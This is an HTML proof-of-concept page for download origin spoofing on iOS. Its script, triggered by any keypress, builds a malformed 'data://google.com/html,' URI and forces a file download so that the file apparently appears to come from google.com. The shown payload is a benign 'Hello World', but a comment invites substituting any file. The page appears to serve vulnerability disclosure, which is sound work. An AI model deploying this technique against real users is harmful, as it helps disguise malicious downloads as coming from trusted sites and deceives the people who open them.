<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Download & Origin Spoofing on iOS</title>
</head>
<body>
  <center><h2>PoC for Download Origin Spoofing on iOS</h2></center>

  <script>
    // Listen for a keydown event to trigger download
    window.addEventListener('keydown', function(e) {
      openDownload();
    });

    // Function to trigger the download using the malformed data URL
    function openDownload() {
      // Here I've inserted a simple base64-encoded "Hello World" string as the payload
      // You can replace this payload with any base64-encoded string for a file
      const payload = "data:text/plain;base64,SGVsbG8gd29ybGQ="; // "Hello World" in base64
      initiateDownload("data://google.com/html," + encodeURIComponent(payload), "spoofedfile.txt");
    }

    // Helper function to initiate the download
    function initiateDownload(uri, name) {
      const link = document.createElement("a");
      link.href = uri;
      link.download = name;
      document.body.appendChild(link);
      link.click();
      document.body.removeChild(link);
    }
  </script>

  <p>Press any key to start the download. The payload is base64-encoded "Hello World".</p>
</body>
</html>
